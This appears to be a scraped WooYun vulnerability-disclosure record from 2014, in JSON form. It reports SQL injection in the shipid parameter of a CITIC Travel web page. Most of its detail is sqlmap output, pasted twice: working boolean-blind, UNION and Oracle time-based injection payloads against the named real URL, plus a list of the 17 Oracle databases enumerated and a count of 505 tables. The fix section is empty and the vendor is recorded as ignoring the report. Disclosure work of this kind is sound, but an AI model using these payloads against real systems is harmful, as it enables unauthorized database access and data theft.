{"id": 50497, "wybug_id": "wooyun-2014-077672", "wybug_title": "中信旅游sql注入", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2014-09-28 18:12", "wybug_open_date": "2014-11-12 18:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 公司成立于1987年，是中信集团的全资子公司。经营入境市场、出境市场、国内市场、签证业务、中国公民因私出入境的咨询和代办服务等旅行社业务以及旅游酒店业务和旅游资源开发业务。是国家特许经营中国公民出境游指定组团社、首批指定经营大陆居民赴台游业务的旅行社。中信旅游集团有限公司是全国“百强旅行社”和“5A级旅行社”，是首批北京市旅游标准化示范单位。 详细说明：  1.http://www.travel.citic.com/shipList.jsp?shipid=1660 \nsqlmap identified the following injection points with a total of 43 HTTP(s) requests:---Place: GETParameter: shipid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: shipid=1660 AND 8987=8987    Type: UNION query    Title: Generic UNION query (NULL) - 6 columns    Payload: shipid=-4363 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(104)||CHR(114)||CHR(121)||CHR(113)||CHR(108)||CHR(88)||CHR(83)||CHR(74)||CHR(82)||CHR(89)||CHR(112)||CHR(65)||CHR(89)||CHR(99)||CHR(113)||CHR(97)||CHR(104)||CHR(116)||CHR(113) FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: shipid=1660 AND 4003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(105)||CHR(119)||CHR(66),3)---web application technology: Nginx, JSPback-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: shipid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: shipid=1660 AND 8987=8987    Type: UNION query    Title: Generic UNION query (NULL) - 6 columns    Payload: shipid=-4363 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(104)||CHR(114)||CHR(121)||CHR(113)||CHR(108)||CHR(88)||CHR(83)||CHR(74)||CHR(82)||CHR(89)||CHR(112)||CHR(65)||CHR(89)||CHR(99)||CHR(113)||CHR(97)||CHR(104)||CHR(116)||CHR(113) FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: shipid=1660 AND 4003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(105)||CHR(119)||CHR(66),5)---web application technology: Nginx, JSPback-end DBMS: Oracleavailable databases [17]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SUBCITIC[*] SYS[*] SYSMAN[*] SYSTEM[*] TRAVELADMIN[*] TSMSYS[*] WMSYS[*] XDB\n2.505个表\n\n   漏洞证明：  1.http://www.travel.citic.com/shipList.jsp?shipid=1660 \nsqlmap identified the following injection points with a total of 43 HTTP(s) requests:---Place: GETParameter: shipid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: shipid=1660 AND 8987=8987    Type: UNION query    Title: Generic UNION query (NULL) - 6 columns    Payload: shipid=-4363 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(104)||CHR(114)||CHR(121)||CHR(113)||CHR(108)||CHR(88)||CHR(83)||CHR(74)||CHR(82)||CHR(89)||CHR(112)||CHR(65)||CHR(89)||CHR(99)||CHR(113)||CHR(97)||CHR(104)||CHR(116)||CHR(113) FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: shipid=1660 AND 4003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(105)||CHR(119)||CHR(66),3)---web application technology: Nginx, JSPback-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: shipid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: shipid=1660 AND 8987=8987    Type: UNION query    Title: Generic UNION query (NULL) - 6 columns    Payload: shipid=-4363 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(104)||CHR(114)||CHR(121)||CHR(113)||CHR(108)||CHR(88)||CHR(83)||CHR(74)||CHR(82)||CHR(89)||CHR(112)||CHR(65)||CHR(89)||CHR(99)||CHR(113)||CHR(97)||CHR(104)||CHR(116)||CHR(113) FROM DUAL--     Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: shipid=1660 AND 4003=DBMS_PIPE.RECEIVE_MESSAGE(CHR(80)||CHR(105)||CHR(119)||CHR(66),5)---web application technology: Nginx, JSPback-end DBMS: Oracleavailable databases [17]:[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SUBCITIC[*] SYS[*] SYSMAN[*] SYSTEM[*] TRAVELADMIN[*] TSMSYS[*] WMSYS[*] XDB\n2.505个表\n\n   修复方案：  .   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}